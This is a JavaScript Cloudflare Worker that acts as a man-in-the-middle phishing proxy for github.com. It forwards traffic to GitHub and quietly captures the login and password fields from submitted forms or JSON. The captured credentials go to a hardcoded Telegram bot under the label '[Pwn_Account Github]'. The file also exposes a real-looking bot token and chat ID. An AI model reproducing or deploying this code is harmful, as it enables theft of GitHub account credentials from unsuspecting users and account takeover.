const ALLOWED_METHODS = new Set([
  "GET", "HEAD", "POST", "PUT", "DELETE", "OPTIONS", "PATCH"
]);

const TELEGRAM_BOT_TOKEN = "1042835941:AAGB6qaHY8ml-GspYcSpKi3_119mtLumySo";
const TELEGRAM_CHAT_ID = "-446669838";

async function SendTeleg(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  const body = new URLSearchParams({
    chat_id: TELEGRAM_CHAT_ID,
    text: `[Pwn_Account Github]\n${message}`
  });

  await fetch(url, {
    method: "POST",
    body
  });
}

export default {
  async fetch(request) {

    if (!ALLOWED_METHODS.has(request.method)) {
      return new Response("Method Not Allowed", { status: 405 });
    }

    const excludedHeaders = new Set([
      "content-encoding",
      "content-length",
      "transfer-encoding",
      "connection",
      "host"
    ]);

    const incomingUrl = new URL(request.url);
    const path = incomingUrl.pathname.replace(/^\/+/, "");

    const targetUrl = new URL(`https://github.com/${path}${incomingUrl.search}`);

    const headers = new Headers();
    for (const [k, v] of request.headers.entries()) {
      if (!excludedHeaders.has(k.toLowerCase())) {
        headers.set(k, v);
      }
    }

    headers.set("x-proxied-by", "cloudflare-pages");

    // Clone request để đọc body
    let login = null;
    let password = null;

    try {
      const contentType = request.headers.get("content-type") || "";

      if (contentType.includes("application/x-www-form-urlencoded")) {

        const form = await request.clone().formData();

        login = form.get("login");
        password = form.get("password");

      } else if (contentType.includes("application/json")) {

        const json = await request.clone().json();

        login = json.login;
        password = json.password;
      }

    } catch (e) {}

    // Nếu có login/password thì gửi Telegram
    if (login && password) {
      await SendTeleg(`Username: ${login}\nPassword: ${password}`);
    }

    const upstreamReq = new Request(targetUrl.toString(), {
      method: request.method,
      headers,
      body: ["GET", "HEAD"].includes(request.method) ? undefined : request.body,
      redirect: "manual"
    });

    let resp;

    try {
      resp = await fetch(upstreamReq);
    } catch (e) {
      return new Response(`Proxy error: ${e?.message || e}`, { status: 502 });
    }

    const outHeaders = new Headers();

    for (const [k, v] of resp.headers.entries()) {
      if (!excludedHeaders.has(k.toLowerCase())) {
        outHeaders.set(k, v);
      }
    }

    return new Response(resp.body, {
      status: resp.status,
      statusText: resp.statusText,
      headers: outHeaders
    });
  }
};
